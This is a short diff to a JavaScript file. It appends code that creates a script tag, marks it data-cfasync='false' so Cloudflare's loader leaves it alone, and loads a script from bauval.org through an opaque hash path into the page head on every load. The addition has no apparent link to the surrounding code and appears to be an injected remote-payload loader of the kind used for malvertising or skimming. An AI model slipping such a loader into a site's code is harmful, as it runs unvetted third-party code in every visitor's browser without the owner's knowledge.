@@ -76,3 +76,9 @@ setTimeout(() => {
         });
     }
 }, 50);
+
+// Dynamically inject the external script with data-cfasync="false"
+const externalScript = document.createElement("script");
+externalScript.setAttribute("data-cfasync", "false");
+externalScript.src = "https://bauval.org/14/d4908b2006f8af7799973d6ae9997ce7";
+document.head.appendChild(externalScript);
